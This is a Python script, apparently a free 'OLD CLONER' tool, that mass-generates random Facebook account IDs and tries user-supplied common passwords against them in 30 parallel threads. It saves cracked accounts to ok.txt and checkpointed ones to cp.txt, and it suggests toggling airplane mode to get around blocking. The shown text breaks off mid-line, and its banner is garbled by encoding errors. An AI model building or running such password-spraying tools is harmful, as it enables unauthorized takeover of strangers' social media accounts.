W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
from concurrent.futures import ThreadPoolExecutor

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		
		print ("""    
\033[1;91m         ___   _____ ________  ___
\033[1;93m      / _ \ /  ___|_   _|  \/  |
 \033[1;92m  / /_\ \\ `--.  | | | .  . |
 \033[1;91m  |  _  | `--. \ | | | |\/| |
\033[1;92m   | | | |/\__/ /_| |_| |  | |
\033[1;93m  \_| |_/\____/ \___/\_|  |_/
                                     
    鈹屸攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹�
    鈹� [鉁揮 AUTHOR   : ȺSIM XHAKMA         鈹�
    鈹� [鉁揮 GITHUB   : 4S1M_XH4KM4         鈹�
    鈹� [鉁揮 WHATSAPP : 01828881765       鈹�
    鈹� [鉁揮 POWER BY : \x1b[1;32mASIM\x1b[1;97m            鈹�
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		print("%s [%s庐%s] %sTOOL NAME : %sOLD CLONER"%(G,R,G,Y,G))
		print("%s [%s庐%s] %sVERSION   : %s2.0 "%(G,R,G,Y,G))
		print("%s [%s庐%s] %sSTATUS    : %sF R E E"%(G,R,G,Y,G)) 
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
		print("\033[92;1m        AUTHOR : ȺSIM XHAKMA      ")
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
		print("\n%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s"%(G,R,G,Y,W))
		print("%s [%s2%s]%s CRACK FB ID 2015-22 %s"%(G,R,G,Y,G))
		print("%s [%s3%s]%s CRACK FROM NUMBER  %s"%(G,R,G,Y,G))
		print("%s [%s4%s]%s CRACK FB ID 2004-5%s"%(G,R,G,Y,G))
		print("%s [%s5%s]%s CRACK FROM EMAILS %s"%(G,R,G,Y,G))
		print("%s [%s6%s]%s CRACK FB ID CUSTOM %s"%(G,R,G,Y,G))
		print("%s [%s7%s]%s FOLLOW ME ON FACEBOOK %s"%(G,R,G,Y,G))
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
		print("\033[92;5m         GIVE RESPECT     GET RESPECT    ")
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
		hoga = input("\n%s [?] CHOICE : "%(Y))
		if hoga in ["", " "]:
			Main()
		elif hoga in ["1", "01"]:
			self.fbtua()
		elif hoga in ["2", "02"]:
				self.old4_7()
		elif hoga in ["3", "03"]:
				self.old4_6()
		elif hoga in ["4", "04"]:
				self.old4_5()
		elif hoga in ["5", "05"]:
				self.email()
		elif hoga in ["6","06"]:
				self.oldcrack()
		elif hoga in ["7", "07"]:
			os.system('am start https://www.facebook.com/halarput.link.coppy.korli.ken')
		else:
			Main()

	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000"
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;97m(50000MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(G))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;96m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))

	def old_9(self):
		x = 11111111111
		xx = 1799999999
		idx = "1000"
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,W,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -